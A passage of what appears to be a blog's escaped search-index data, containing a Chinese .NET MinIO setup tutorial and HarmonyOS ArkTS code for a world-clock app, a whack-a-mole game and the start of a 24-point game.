string bucketName = \u0026#34;io617\u0026#34;; //Bucket string filePath = \u0026#34;D:\\\\UploadPath\\\\FileSystem\\\\files\\\\c.jpg\u0026#34;;////.png\u0026#34;; // var minioClient = (MinioClient?)new MinioClient() .WithEndpoint(endpoint) .WithCredentials(accessKey, secretKey) .Build(); try { // 上传文件 string fileName = Path.GetFileName(filePath); using (var fileStream = File.OpenRead(filePath)) { var startTime = DateTime.Now; var filestream = fileStream; using (filestream) { var file_write_size = filestream.Length; var putObjectArgs = new PutObjectArgs() .WithBucket(bucketName) .WithObject(\u0026#34;obj2222\u0026#34;) .WithStreamData(filestream) .WithObjectSize(filestream.Length) .WithContentType(\u0026#34;application/octet-stream\u0026#34;) .WithHeaders(null); minioClient.PutObjectAsync(putObjectArgs).ConfigureAwait(false);//await } // minioClient.PutObject(bucketName, fileName, fileStream, fileStream.Length); } Console.WriteLine($\u0026#34;File {fileName} uploaded successfully\u0026#34;); } catch (Exception e) { Console.WriteLine($\u0026#34;Error: {e.Message}\u0026#34;); } 代码创建bucket // code create bucket var beArgs = new BucketExistsArgs() .WithBucket(bucket); bool found = await _minioClient.BucketExistsAsync(beArgs).ConfigureAwait(false); if (!found) { var mbArgs = new MakeBucketArgs() .WithBucket(bucket); await _minioClient.MakeBucketAsync(mbArgs).ConfigureAwait(false); } \u0026ndash; https://min.io/docs/minio/linux/index.html?ref=con\n","permalink":"https://qfsyso.github.io/posts/.net-minio/","summary":"安装MinIO docker\ndocker run --name minio -p 9000:9000 -p 9090:9090 -d -e \u0026#34;MINIO_ROOT_USER=minio\u0026#34; -e \u0026#34;MINIO_ROOT_PASSWORD=minio123\u0026#34; -v /usr/local/minio-data:/data -v /usr/local/minio-config:/root/.minio minio/minio server data --console-address \u0026#34;:9090\u0026#34; --address \u0026#34;:9000\u0026#34; 后台创建 Buckets 访问 localhost:9000 登陆后创建Buckets io617\n创建密钥 Access Keys\nadd package dotnet add package Minio 配置json //... \u0026#34;Minio\u0026#34;: { \u0026#34;Endpoint\u0026#34;: \u0026#34;192.168.80.xx:9000\u0026#34;,//\u0026#34;localhost:9000\u0026#34;, //90/service-account-credentials \u0026#34;AccessKey\u0026#34;: \u0026#34;EctmxSNB9FqfW6UWxxx\u0026#34;, \u0026#34;SecretKey\u0026#34;: \u0026#34;frQhYoH1k7UphMxbwK2PiG2xKadzPjxxx\u0026#34;, \u0026#34;BucketName\u0026#34;: \u0026#34;io617\u0026#34; }, //... 服务类MinioService public class MinioService { private readonly MinioClient _minioClient; private readonly string _bucketName; public MinioService(IConfiguration configuration) { var endpoint = configuration[\u0026#34;Minio:Endpoint\u0026#34;]; var accessKey = configuration[\u0026#34;Minio:AccessKey\u0026#34;]; var secretKey = configuration[\u0026#34;Minio:SecretKey\u0026#34;]; _bucketName = configuration[\u0026#34;Minio:BucketName\u0026#34;]; //http://localhost:9090/api/v1/service-account-credentials _minioClient = (MinioClient?","title":".NET MinIO"},{"content":"HarmonyOS Next WorldTime Whack Mole\nHarmonyOS应用 鸿蒙NEXT开发 世界时应用 打地鼠\n环境 Windows 11 DevEco Studio 5.0.1 Release Version: 5.0.5.306 HarmonyOS 5.0.1(13) ArkTS ArkUI API 13\nWorldTime 世界时应用 实现思路 获取时区信息 更新时间 搜索功能\n代码 import { i18n } from \u0026#39;@kit.LocalizationKit\u0026#39; // 导入国际化模块，用于处理多语言 import { inputMethod } from \u0026#39;@kit.IMEKit\u0026#39; // 导入输入法模块 @ObservedV2 // 观察者装饰器，用于观察状态变化 class CityTimeInfo { // 定义城市时间信息类 @Trace cityName: string = \u0026#34;\u0026#34;; // 城市名称，初始为空字符串 @Trace currentTime: string = \u0026#34;\u0026#34;; // 当前时间，初始为空字符串 timeZone: i18n.TimeZone; // 时区属性 constructor(cityName: string, timeZone: i18n.TimeZone) { // 构造函数，接收城市名称和时区 this.cityName = cityName; // 设置城市名称 this.timeZone = timeZone; // 设置时区 } @Trace isVisible: boolean = true; // 是否可见，初始为true } @Entry // 入口组件装饰器 @Component // 组件装饰器 struct WorldClockApp { // 定义世界时钟应用组件 @State private searchText: string = \u0026#39;\u0026#39;; // 搜索文本，初始为空字符串 @State private cityTimeList: CityTimeInfo[] = []; // 城市时间信息列表，初始为空数组 private lineColor: string = \u0026#34;#e6e6e6\u0026#34;; // 边框颜色 private titleBackgroundColor: string = \u0026#34;#f8f8f8\u0026#34;; // 标题背景色 private textColor: string = \u0026#34;#333333\u0026#34;; // 文字颜色 private basePadding: number = 4; // 内边距 private lineWidth: number = 2; // 边框宽度 private rowHeight: number = 50; // 行高 private ratio: number[] = [1, 1]; // 列宽比例 private textSize: number = 14; // 基础字体大小 private updateIntervalId = 0; // 更新间隔ID updateAllCityTimes() { // 更新所有城市的时间 const locale = i18n.System.getSystemLocale(); // 获取系统语言环境 for (const cityTime of this.cityTimeList) { // 遍历城市时间列表 const timeZoneId: string = cityTime.timeZone.getID(); // 获取时区ID const calendar = i18n.getCalendar(locale); // 获取日历对象 calendar.setTimeZone(timeZoneId); // 设置日历的时区 // 获取当前时间的各个部分 const year = calendar.get(\u0026#34;year\u0026#34;).toString().padStart(4, \u0026#39;0\u0026#39;); // 年 const month = calendar.get(\u0026#34;month\u0026#34;).toString().padStart(2, \u0026#39;0\u0026#39;); // 月 const day = calendar.get(\u0026#34;date\u0026#34;).toString().padStart(2, \u0026#39;0\u0026#39;); // 日 const hour = calendar.get(\u0026#34;hour_of_day\u0026#34;).toString().padStart(2, \u0026#39;0\u0026#39;); // 小时 const minute = calendar.get(\u0026#34;minute\u0026#34;).toString().padStart(2, \u0026#39;0\u0026#39;); // 分钟 const second = calendar.get(\u0026#34;second\u0026#34;).toString().padStart(2, \u0026#39;0\u0026#39;); // 秒 // 更新城市的当前时间字符串 cityTime.currentTime = `${year}年${month}月${day}日 ${hour}:${minute}:${second}`; } } onPageShow(): void { // 页面显示时的处理 clearInterval(this.updateIntervalId); // 清除之前的定时器 this.updateIntervalId = setInterval(() =\u0026gt; { // 设置新的定时器 this.updateAllCityTimes(); // 每秒更新所有城市的时间 }, 1000); } onPageHide(): void { // 页面隐藏时的处理 clearInterval(this.updateIntervalId); // 清除定时器 } private highlightSearchText(cityTime: CityTimeInfo, keyword: string) { // 高亮搜索文本 let text = cityTime.cityName // 获取城市名称 if (!keyword) { // 如果没有关键词 cityTime.isVisible = true // 设置城市可见 return [text] // 返回城市名称 } let segments: string[] = []; // 存储分段文本 let lastMatchEnd: number = 0; // 上一个匹配结束的位置 while (true) { // 循环查找关键词 const matchIndex = text.indexOf(keyword, lastMatchEnd); // 查找关键词位置 if (matchIndex === -1) { // 如果没有找到 segments.push(text.slice(lastMatchEnd)); // 添加剩余文本 break; // 退出循环 } else { segments.push(text.slice(lastMatchEnd, matchIndex)); // 添加匹配前的文本 segments.push(text.slice(matchIndex, matchIndex + keyword.length)); // 添加匹配的关键词 lastMatchEnd = matchIndex + keyword.length; // 更新最后匹配结束位置 } } cityTime.isVisible = (segments.indexOf(keyword) != -1) // 设置城市可见性 return segments; // 返回分段文本 } aboutToAppear() { // 组件即将出现时的处理 const timeZoneIds: Array\u0026lt;string\u0026gt; = i18n.TimeZone.getAvailableIDs(); // 获取可用时区ID列表 this.cityTimeList.push(new CityTimeInfo(\u0026#39;北京 (中国)\u0026#39;, i18n.getTimeZone())); // 添加北京的城市时间信息 //this.cityTimeList.push(new CityTimeInfo(\u0026#39;东京 (日本)\u0026#39;, i18n.getTimeZone())); // 添加北京的城市时间信息 //this.cityTimeList.push(new CityTimeInfo(\u0026#39;贝伦 (巴西)\u0026#39;, i18n.getTimeZone())); // 添加北京的城市时间信息 for (const id of timeZoneIds) { // 遍历时区ID const cityDisplayName = i18n.TimeZone.getCityDisplayName(id.split(\u0026#39;/\u0026#39;)[1], \u0026#34;zh-CN\u0026#34;); // 获取城市显示名称 if (cityDisplayName) { // 如果城市名称存在 this.cityTimeList.push(new CityTimeInfo(cityDisplayName, i18n.getTimeZone(id))); // 添加城市时间信息 } } this.updateAllCityTimes(); // 更新所有城市的时间 } build() { // 构建组件的UI Column({ space: 0 }) { // 创建一个垂直列 Search({ value: $$this.searchText })// 创建搜索框 .margin(this.basePadding)// 设置边距 .fontFeature(\u0026#34;\\\u0026#34;ss01\\\u0026#34; on\u0026#34;) // 设置字体特性 Column() { // 创建一个列 Row() { // 创建一行 Text(\u0026#39;城市\u0026#39;)// 显示“城市”文本 .height(\u0026#39;100%\u0026#39;)// 高度占满 .layoutWeight(this.ratio[0])// 设置布局权重 .textAlign(TextAlign.Center)// 文本居中 .fontSize(this.textSize)// 设置字体大小 .fontWeight(600)// 设置字体粗细 .fontColor(this.textColor) // 设置字体颜色 Line().height(\u0026#39;100%\u0026#39;).width(this.lineWidth).backgroundColor(this.lineColor) // 创建分隔线 Text(\u0026#39;时间\u0026#39;)// 显示“时间”文本 .height(\u0026#39;100%\u0026#39;)// 高度占满 .layoutWeight(this.ratio[1])// 设置布局权重 .textAlign(TextAlign.Center)// 文本居中 .fontSize(this.textSize)// 设置字体大小 .fontWeight(600)// 设置字体粗细 .fontColor(this.textColor) // 设置字体颜色 }.height(this.rowHeight).borderWidth(this.lineWidth).borderColor(this.lineColor) // 设置行高和边框 .backgroundColor(this.titleBackgroundColor) // 设置背景色 }.width(`100%`).padding({ left: this.basePadding, right: this.basePadding }) // 设置列宽和内边距 Scroll() { // 创建可滚动区域 Column() { // 创建一个列 ForEach(this.cityTimeList, (item: CityTimeInfo) =\u0026gt; { // 遍历城市时间列表 Row() { // 创建一行 Text() { // 创建文本 ForEach(this.highlightSearchText(item, this.searchText), (segment: string, index: number) =\u0026gt; { // 高亮搜索文本 ContainerSpan() { // 创建容器 Span(segment)// 创建文本段 .fontColor(segment === this.searchText ? Color.White : Color.Black)// 设置字体颜色 .onClick(() =\u0026gt; { // 点击事件 console.info(`高亮文本被点击：${segment}`); // 输出点击的文本 console.info(`点击索引：${index}`); // 输出点击的索引 }); }.textBackgroundStyle({ // 设置文本背景样式 color: segment === this.searchText ? Color.Red : Color.Transparent // 根据是否匹配设置背景色 }); }); } .height(\u0026#39;100%\u0026#39;) // 高度占满 .layoutWeight(this.ratio[0]) // 设置布局权重 .textAlign(TextAlign.Center) // 文本居中 .fontSize(this.textSize) // 设置字体大小 .fontColor(this.textColor) // 设置字体颜色 Line().height(\u0026#39;100%\u0026#39;).width(this.lineWidth).backgroundColor(this.lineColor) // 创建分隔线 Text(item.currentTime)// 显示当前时间 .height(\u0026#39;100%\u0026#39;)// 高度占满 .layoutWeight(this.ratio[1])// 设置布局权重 .textAlign(TextAlign.Center)// 文本居中 .fontSize(this.textSize)// 设置字体大小 .fontColor(this.textColor) // 设置字体颜色 } .height(this.rowHeight) // 设置行高 .borderWidth({ left: this.lineWidth, right: this.lineWidth, bottom: this.lineWidth }) // 设置边框宽度 .borderColor(this.lineColor) // 设置边框颜色 .visibility(item.isVisible ? Visibility.Visible : Visibility.None) // 根据可见性设置显示状态 }) }.width(`100%`).padding({ left: this.basePadding, right: this.basePadding }) // 设置宽度和内边距 } .width(\u0026#39;100%\u0026#39;) // 设置宽度占满 .layoutWeight(1) // 设置布局权重 .align(Alignment.Top) // 对齐方式 .onScrollStart(() =\u0026gt; { // 滚动开始事件 this.onPageHide() // 页面隐藏处理 }) .onScrollStop(() =\u0026gt; { // 滚动停止事件 this.onPageShow() // 页面显示处理 }) .onTouch((event) =\u0026gt; { // 触摸事件 if (event.type == TouchType.Down) { // 如果是按下事件 inputMethod.getController().stopInputSession() // 停止输入会话 } }) } } } 打地鼠 主要功能： 地鼠组件：Hamster 结构体定外观，依单元格宽调尺寸。 单元格 Cell：有地鼠显示状态及缩放选项，含 setSelectedTrueTime 设显示时间戳、checkTime 检是否超停留时间隐藏。 游戏主组件 Index：维护核心状态如动画间隔等，有 startGame 与 endGame 方法初始化与重置数据。 界面构建：Index 组件 build 方法定布局，含计时器、得分板及单元格。 时间与显示逻辑：TextTimer 组件控时，定时选单元格显地鼠，点击地鼠增分并执行动画。 用户交互：点击地鼠单元格得分，点击后地鼠隐藏且更新得分。\n代码 //index.ets import { curves, window } from \u0026#39;@kit.ArkUI\u0026#39; // 导入所需的库和模块 // 定义地鼠组件 @Component struct Hamster { @Prop cellWidth: number // 定义一个属性，表示单元格的宽度 build() { Stack() { // 创建一个堆叠布局 // 身体 Text() .width(`${this.cellWidth / 2}lpx`) // 设置宽度为单元格宽度的一半 .height(`${this.cellWidth / 3 * 2}lpx`) // 设置高度为单元格高度的2/3 .backgroundColor(\u0026#34;#b49579\u0026#34;) // 设置背景颜色 .borderRadius({ topLeft: \u0026#39;50%\u0026#39;, topRight: \u0026#39;50%\u0026#39; }) // 设置圆角 .borderColor(\u0026#34;#2a272d\u0026#34;) // 设置边框颜色 .borderWidth(1) // 设置边框宽度 // 嘴巴 Ellipse() .width(`${this.cellWidth / 4}lpx`) // 设置嘴巴的宽度 .height(`${this.cellWidth / 5}lpx`) // 设置嘴巴的高度 .fillOpacity(1) // 设置填充不透明度 .fill(\u0026#34;#e7bad7\u0026#34;) // 设置填充颜色 .stroke(\u0026#34;#563e3f\u0026#34;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin({ top: `${this.cellWidth / 6}lpx` }) // 设置上边距 // 左眼睛 Ellipse() .width(`${this.cellWidth / 9}lpx`) // 设置左眼睛的宽度 .height(`${this.cellWidth / 6}lpx`) // 设置左眼睛的高度 .fillOpacity(1) // 设置填充不透明度 .fill(\u0026#34;#313028\u0026#34;) // 设置填充颜色 .stroke(\u0026#34;#2e2018\u0026#34;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin({ bottom: `${this.cellWidth / 3}lpx`, right: `${this.cellWidth / 6}lpx` }) // 设置下边距和右边距 // 右眼睛 Ellipse() .width(`${this.cellWidth / 9}lpx`) // 设置右眼睛的宽度 .height(`${this.cellWidth / 6}lpx`) // 设置右眼睛的高度 .fillOpacity(1) // 设置填充不透明度 .fill(\u0026#34;#313028\u0026#34;) // 设置填充颜色 .stroke(\u0026#34;#2e2018\u0026#34;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin({ bottom: `${this.cellWidth / 3}lpx`, left: `${this.cellWidth / 6}lpx` }) // 设置下边距和左边距 // 左眼瞳 Ellipse() .width(`${this.cellWidth / 20}lpx`) // 设置左眼瞳的宽度 .height(`${this.cellWidth / 15}lpx`) // 设置左眼瞳的高度 .fillOpacity(1) // 设置填充不透明度 .fill(\u0026#34;#fefbfa\u0026#34;) // 设置填充颜色 .margin({ bottom: `${this.cellWidth / 2.5}lpx`, right: `${this.cellWidth / 6}lpx` }) // 设置下边距和右边距 // 右眼瞳 Ellipse() .width(`${this.cellWidth / 20}lpx`) // 设置右眼瞳的宽度 .height(`${this.cellWidth / 15}lpx`) // 设置右眼瞳的高度 .fillOpacity(1) // 设置填充不透明度 .fill(\u0026#34;#fefbfa\u0026#34;) // 设置填充颜色 .margin({ bottom: `${this.cellWidth / 2.5}lpx`, left: `${this.cellWidth / 6}lpx` }) // 设置下边距和左边距 }.width(`${this.cellWidth}lpx`).height(`${this.cellWidth}lpx`) // 设置组件的宽度和高度 } } // 定义单元格类 @ObservedV2 class Cell { @Trace scaleOptions: ScaleOptions = { x: 1, y: 1 }; // 定义缩放选项 @Trace isSelected: boolean = false // true表示显示地鼠，false表示隐藏地鼠 cellWidth: number // 单元格宽度 selectTime: number = 0 // 选择时间 constructor(cellWidth: number) { // 构造函数 this.cellWidth = cellWidth // 初始化单元格宽度 } setSelectedTrueTime() { // 设置选择时间 this.selectTime = Date.now() // 记录当前时间 this.isSelected = true // 设置为选中状态 } checkTime(stayDuration: number) { // 检查停留时间 if (this.isSelected) { // 如果当前是选中状态 if (Date.now() - this.selectTime \u0026gt;= stayDuration) { // 如果停留时间超过设定值 this.selectTime = 0 // 重置选择时间 this.isSelected = false // 设置为未选中状态 } } } } // 定义文本计时器修饰符类 class MyTextTimerModifier implements ContentModifier\u0026lt;TextTimerConfiguration\u0026gt; { constructor() {} applyContent(): WrappedBuilder\u0026lt;[TextTimerConfiguration]\u0026gt; { // 应用内容 return wrapBuilder(buildTextTimer) // 返回构建文本计时器的函数 } } // 构建文本计时器的函数 @Builder function buildTextTimer(config: TextTimerConfiguration) { Column() { Stack({ alignContent: Alignment.Center }) { // 创建一个堆叠布局，内容居中对齐 Circle({ width: 150, height: 150 }) // 创建一个圆形 .fill(config.started ? (config.isCountDown ? 0xFF232323 : 0xFF717171) : 0xFF929292) // 根据状态设置填充颜色 Column() { Text(config.isCountDown ? \u0026#34;倒计时\u0026#34; : \u0026#34;正计时\u0026#34;).fontColor(Color.White) // 显示计时状态 Text( (config.isCountDown ? \u0026#34;剩余\u0026#34; : \u0026#34;已经过去了\u0026#34;) + (config.isCountDown ? (Math.max(config.count / 1000 - config.elapsedTime / 100, 0)).toFixed(0) // 计算剩余时间 : ((config.elapsedTime / 100).toFixed(0)) // 计算已过去时间 ) + \u0026#34;秒\u0026#34; ).fontColor(Color.White) // 显示时间 } } } } // 定义游戏主组件 @Entry @Component struct Index { @State animationIntervalCount: number = 0 // 动画间隔计数 @State appearanceCount: number = 4 // 每次出现的地鼠数量 @State animationInterval: number = 1000 // 地鼠出现的间隔时间 @State hamsterStayDuration: number = 1500 // 地鼠停留时间 @State gameDuration: number = 30000 // 游戏总时长 @State randomPositionIndex: number = 0 // 随机位置 @State cells: Cell[] = [] // 存储地鼠单元格 @State cellWidth: number = 100 // 单元格宽度 @State currentScore: number = 0 // 当前游戏得分 @State timerModifier: MyTextTimerModifier = new MyTextTimerModifier() // 计时器修饰符 countdownTimerController: TextTimerController = new TextTimerController() // 倒计时控制器 timerController: TextTimerController = new TextTimerController() // 正计时控制器 aboutToAppear(): void { // 设置当前app以横屏方式显示 window.getLastWindow(getContext()).then((windowClass) =\u0026gt; { windowClass.setPreferredOrientation(window.Orientation.LANDSCAPE) // 设置为横屏 }) // 显示10个地鼠坑位 for (let i = 0; i \u0026lt; 10; i++) { this.cells.push(new Cell(this.cellWidth)) // 初始化10个单元格 } } endGame() { // 结束游戏 this.animationIntervalCount = 0 // 重置动画间隔计数 this.currentScore = 0 // 重置得分 for (let i = 0; i \u0026lt; this.cells.length; i++) { this.cells[i].isSelected = false // 隐藏所有地鼠 } this.countdownTimerController.reset() // 重置倒计时 this.timerController.reset() // 重置正计时 } startGame() { // 开始游戏 this.endGame() // 结束当前游戏，重置所有状态 this.countdownTimerController.start() // 启动倒计时控制器 this.timerController.start() // 启动正计时控制器 } build() { // 构建游戏界面 Row() { // 创建一个水平布局 // 显示时间与得分 Column({ space: 30 }) { // 创建一个垂直布局，设置间距 // 总时长 Column({ space: 5 }) { // 创建一个垂直布局，设置间距 Text(`倒计时长(秒)`).fontColor(Color.Black) // 显示倒计时长度的文本 Counter() { // 创建一个计数器组件 Text(`${this.gameDuration / 1000}`) // 显示游戏总时长（秒） .fontColor(Color.Black) // 设置字体颜色 } .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加按钮的点击事件 this.gameDuration += 1000; // 每次增加1秒 }).onDec(() =\u0026gt; { // 减少按钮的点击事件 this.gameDuration -= 1000; // 每次减少1秒 this.gameDuration = this.gameDuration \u0026lt; 1000 ? 1000 : this.gameDuration; // 确保最小值为1秒 }); } // 每次出现个数 Column({ space: 5 }) { // 创建一个垂直布局，设置间距 Text(`每次出现(个)`).fontColor(Color.Black) // 显示每次出现的地鼠数量的文本 Counter() { // 创建一个计数器组件 Text(`${this.appearanceCount}`) // 显示每次出现的地鼠数量 .fontColor(Color.Black) // 设置字体颜色 } .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加按钮的点击事件 this.appearanceCount += 1; // 每次增加1个 }).onDec(() =\u0026gt; { // 减少按钮的点击事件 this.appearanceCount -= 1; // 每次减少1个 this.appearanceCount = this.appearanceCount \u0026lt; 1 ? 1 : this.appearanceCount; // 确保最小值为1 }); } // 地鼠每隔多长时间显示 Column({ space: 5 }) { // 创建一个垂直布局，设置间距 Text(`出现间隔(毫秒)`).fontColor(Color.Black) // 显示地鼠出现间隔的文本 Counter() { // 创建一个计数器组件 Text(`${this.animationInterval}`) // 显示地鼠出现的间隔时间 .fontColor(Color.Black) // 设置字体颜色 } .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加按钮的点击事件 this.animationInterval += 100; // 每次增加100毫秒 }).onDec(() =\u0026gt; { // 减少按钮的点击事件 this.animationInterval -= 100; // 每次减少100毫秒 this.animationInterval = this.animationInterval \u0026lt; 100 ? 100 : this.animationInterval; // 确保最小值为100毫秒 }); } // 地鼠停留时间 Column({ space: 5 }) { // 创建一个垂直布局，设置间距 Text(`停留间隔(毫秒)`).fontColor(Color.Black) // 显示地鼠停留时间的文本 Counter() { // 创建一个计数器组件 Text(`${this.hamsterStayDuration}`) // 显示地鼠的停留时间 .fontColor(Color.Black) // 设置字体颜色 } .width(300) // 设置计数器宽度 .onInc(() =\u0026gt; { // 增加按钮的点击事件 this.hamsterStayDuration += 100; // 每次增加100毫秒 }).onDec(() =\u0026gt; { // 减少按钮的点击事件 this.hamsterStayDuration -= 100; // 每次减少100毫秒 this.hamsterStayDuration = this.hamsterStayDuration \u0026lt; 100 ? 100 : this.hamsterStayDuration; // 确保最小值为100毫秒 }); } }.layoutWeight(1).padding({ left: 50 }) // 设置布局权重和左边距 // 游戏区 Flex({ wrap: FlexWrap.Wrap }) { // 创建一个可换行的弹性布局 ForEach(this.cells, (cell: Cell, index: number) =\u0026gt; { // 遍历所有单元格 Stack() { // 创建一个堆叠布局 // 洞 Ellipse() .width(`${this.cellWidth / 1.2}lpx`) // 设置洞的宽度 .height(`${this.cellWidth / 2.2}lpx`) // 设置洞的高度 .fillOpacity(1) // 设置填充不透明度 .fill(\u0026#34;#020101\u0026#34;) // 设置填充颜色 .stroke(\u0026#34;#020101\u0026#34;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin({ top: `${this.cellWidth / 2}lpx` }) // 设置上边距 // 地鼠 Hamster({ cellWidth: this.cellWidth }) // 创建地鼠组件 .visibility(cell.isSelected ? Visibility.Visible : Visibility.None) // 根据状态设置可见性 .scale(cell.scaleOptions) // 设置缩放选项 }.width(`${this.cellWidth}lpx`).height(`${this.cellWidth}lpx`) // 设置堆叠布局的宽度和高度 .margin({ left: `${index == 0 || index == 7 ? this.cellWidth / 2 : 0}lpx` }) // 设置左边距 .onClick(() =\u0026gt; { // 点击事件 if (cell.isSelected) { // 如果当前单元格是选中状态 animateToImmediately({ // 执行动画 duration: 200, // 动画持续时间 curve: curves.springCurve(10, 1, 228, 30), // 动画曲线 onFinish: () =\u0026gt; { // 动画结束后的回调 cell.isSelected = false // 隐藏地鼠 cell.scaleOptions = { x: 1.0, y: 1.0 }; // 重置缩放 this.currentScore += 1 // 增加得分 } }, () =\u0026gt; { cell.scaleOptions = { x: 0, y: 0 }; // 动画开始时缩放到0 }) } }) }) }.width(`${this.cellWidth * 4}lpx`) // 设置游戏区的宽度 // 操作按钮 Column({ space: 20 }) { // 创建一个垂直布局，设置间距 // 倒计时 TextTimer({ isCountDown: true, count: this.gameDuration, controller: this.countdownTimerController }) // 创建倒计时组件 .contentModifier(this.timerModifier) // 应用计时器修饰符 .onTimer((utc: number, elapsedTime: number) =\u0026gt; { // 定义计时器的回调 // 每隔指定时间随机显示地鼠 if (elapsedTime * 10 \u0026gt;= this.animationInterval * this.animationIntervalCount) { // 判断是否达到显示地鼠的时间 this.animationIntervalCount++ // 增加动画间隔计数 // 获取可以出现的位置集合 let availableIndexList: number[] = [] // 存储可用的索引 for (let i = 0; i \u0026lt; this.cells.length; i++) { // 遍历所有单元格 if (!this.cells[i].isSelected) { // 如果当前单元格未被选中 availableIndexList.push(i) // 添加到可用索引列表 } } // 根据每次出现次数 appearanceCount 利用洗牌算法随机抽取 for (let i = 0; i \u0026lt; availableIndexList.length; i++) { // 遍历可用索引列表 let index = Math.floor(Math.random() * (availableIndexList.length - i)) // 随机选择一个索引 let temp = availableIndexList[availableIndexList.length - i - 1] // 交换位置 availableIndexList[availableIndexList.length - i - 1] = availableIndexList[index] availableIndexList[index] = temp } // 随机抽取 appearanceCount，取前几个已经打乱好的顺序 for (let i = 0; i \u0026lt; availableIndexList.length; i++) { // 遍历可用索引列表 if (i \u0026lt; this.appearanceCount) { // 如果索引小于每次出现的数量 this.cells[availableIndexList[i]].setSelectedTrueTime() // 设置选中的单元格为显示状态 } } } if (elapsedTime % 10 == 0) { // 每隔100毫秒检查一次 console.info(\u0026#39;检查停留时间是否已过，如果过了就隐藏地鼠\u0026#39;) // 输出调试信息 for (let i = 0; i \u0026lt; this.cells.length; i++) { // 遍历所有单元格 this.cells[i].checkTime(this.hamsterStayDuration) // 检查每个单元格的停留时间 } } if (elapsedTime * 10 \u0026gt;= this.gameDuration) { // 如果计时结束 let currentScore = this.currentScore // 获取当前得分 this.getUIContext().showAlertDialog({ // 显示结果对话框 // 显示结果页 title: \u0026#39;游戏结束\u0026#39;, // 对话框标题 message: `得分：${currentScore}`, // 显示得分信息 confirm: { // 确认按钮配置 defaultFocus: true, // 默认焦点 value: \u0026#39;我知道了\u0026#39;, // 按钮文本 action: () =\u0026gt; { // 点击后的动作 // 这里可以添加点击确认后的逻辑 } }, onWillDismiss: () =\u0026gt; { // 关闭前的动作 // 这里可以添加关闭前的逻辑 }, alignment: DialogAlignment.Center, // 对齐方式为中心 }); this.endGame() // 结束游戏 } }) Text(`当前得分：${this.currentScore}`) // 显示当前得分 Button(\u0026#39;开始游戏\u0026#39;).clickEffect({ level: ClickEffectLevel.LIGHT }).onClick(() =\u0026gt; { // 创建开始游戏按钮 this.startGame() // 点击后开始游戏 }) Button(\u0026#39;结束游戏\u0026#39;).clickEffect({ level: ClickEffectLevel.LIGHT }).onClick(() =\u0026gt; { // 创建结束游戏按钮 this.endGame() // 点击后结束游戏 }) }.layoutWeight(1) // 设置布局权重 } .height(\u0026#39;100%\u0026#39;) // 设置整体高度为100% .width(\u0026#39;100%\u0026#39;) // 设置整体宽度为100% .backgroundColor(\u0026#34;#61ac57\u0026#34;) // 设置背景颜色 .justifyContent(FlexAlign.SpaceBetween) // 设置内容对齐方式 } } 24 巧算24点是一个经典的数学游戏，其规则简单而富有挑战性：玩家需利用给定的四个数字，通过加、减、乘、除运算，使得计算结果等于24。\n代码 import { promptAction } from \u0026#39;@kit.ArkUI\u0026#39; // 导入用于提示用户的工具包 @ObservedV2 // 装饰器，使类成为可观察对象 class Cell { // 定义一个Cell类，代表游戏中的一个单元格 @Trace value: number // 使用装饰器标记value属性，使其成为追踪属性 @Trace displayValue: string // 同上，用于显示的值 @Trace isVisible: boolean // 同上，判断是否可见 @Trace xPosition: number // 同上，x坐标位置 @Trace yPosition: number // 同上，y坐标位置 columnIndex: number // 列索引 rowIndex: number // 行索引 constructor(rowIndex: number, columnIndex: number) { // 构造函数 this.rowIndex = rowIndex // 设置行索引 this.columnIndex = columnIndex // 设置列索引 this.xPosition = 0 // 初始化x坐标位置 this.yPosition = 0 // 初始化y坐标位置 this.value = 0 // 初始化数值 this.displayValue = \u0026#39;\u0026#39; // 初始化显示值 this.isVisible = true // 初始化可见性 } setDefaultValue(value: number) { // 设置单元格的默认值 this.value = value // 设置数值 this.displayValue = `${value}` // 设置显示值 this.isVisible = true // 设置为可见 } performOperation(otherCell: Cell, operationName: string) { // 执行与其他单元格的操作 switch (operationName) { // 根据操作名称进行不同的运算 case \u0026#34;加\u0026#34;: // 如果是加法 this.value = otherCell.value + this.value // 计算新值 break // 结束case块 case \u0026#34;减\u0026#34;: // 如果是减法 this.value = otherCell.value - this.value // 计算新值 break // 结束case块 case \u0026#34;乘\u0026#34;: // 如果是乘法 this.value = otherCell.value * this.value // 计算新值 break // 结束case块 case \u0026#34;除\u0026#34;: // 如果是除法 if (this.value === 0) { // 检查除数是否为0 promptAction.showToast({ message: \u0026#39;除数不能为0\u0026#39;, bottom: 400 }) // 提示错误信息 return false // 返回false，表示操作无效 } this.value = otherCell.value / this.value // 计算新值 break // 结束case块 } otherCell.isVisible = false // 隐藏参与运算的另一个单元格 this.displayValue = `${this.value \u0026gt;= 0 ? \u0026#39;\u0026#39; : \u0026#39;-\u0026#39;}${this.convertToFraction(Math.abs(this.value))}` // 更新显示值 return true // 返回true，表示操作成功 } findGreatestCommonDivisor(a: number, b: number): number { // 计算两个数的最大公约数 return b === 0 ? a : this.findGreatestCommonDivisor(b, a % b) // 使用递归算法求最大公约数 } convertToFraction(decimal: number): string { // 将小数转换为分数形式 let tolerance = 1.0E-6 // 设置容差值 let maxIterations = 1000 // 设置最大迭代次数 let pNumerator = 1 // 分子初始化 let pDenominator = 0 // 分母初始化 let qNumerator = 0 // 辅助变量 let qDenominator = 1 // 辅助变量 let currentDecimal = decimal // 当前处理的小数 let iterationCount = 0 // 迭代计数 do { // 执行直到满足条件 let integerPart = Math.floor(currentDecimal) // 取整部分 let temp = pNumerator // 临时保存分子 pNumerator = integerPart * pNumerator + pDenominator // 更新分子 pDenominator = temp // 更新分母 temp = qNumerator // 临时保存辅助变量 qNumerator = integerPart * qNumerator + qDenominator // 更新辅助变量 qDenominator = temp // 更新辅助变量 currentDecimal = 1 / (currentDecimal - integerPart) // 更新小数部分 iterationCount++ // 增加迭代计数 } while (Math.abs(decimal - pNumerator / qNumerator) \u0026gt; decimal * tolerance \u0026amp;\u0026amp; iterationCount \u0026lt; maxIterations) // 继续迭代直到达到容差或最大迭代次数 if (iterationCount \u0026gt;= maxIterations) { // 如果达到最大迭代次数 return `${decimal}` // 返回原小数 } let gcdValue = this.calculateIterativeGcd(pNumerator, qNumerator) // 计算分子和分母的最大公约数 let reducedNumerator = 